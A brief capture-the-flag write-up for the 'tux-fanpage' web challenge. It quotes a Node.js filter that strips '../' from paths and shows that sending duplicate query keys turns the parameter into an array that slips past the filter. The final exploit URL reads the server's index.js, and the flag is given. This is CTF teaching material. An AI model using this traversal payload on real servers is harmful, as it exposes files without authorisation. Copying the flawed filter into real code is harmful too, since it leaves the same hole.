# tux-fanpage

Source: [index.js](./index.js)

Based on a quick scan through the code, it appears we need to use a directory traversal attack. However, there are some functions in place as a filter.

```js
//Prevent directory traversal attack
function preventTraversal(dir) {
	if (dir.includes("../")) {
		let res = dir.replace("../", "");
		return preventTraversal(res);
	}

	//In case people want to test locally on windows
	if (dir.includes("..\\")) {
		let res = dir.replace("..\\", "");
		return preventTraversal(res);
	}
	return dir;
}

//Get absolute path from relative path
function prepare(dir) {
	return path.resolve("./public/" + dir);
}
```

One thing we notice is that we can pass an array in the query string through duplicate keys (eg. `?path=a&path=b`). This means that we can defeat the `preventTraversal` function.

Final Exploit:
https://tux-fanpage.2020.redpwnc.tf/page?path=a&path=/../../index.js

Flag: `flag{tr4v3rsal_Tim3}`
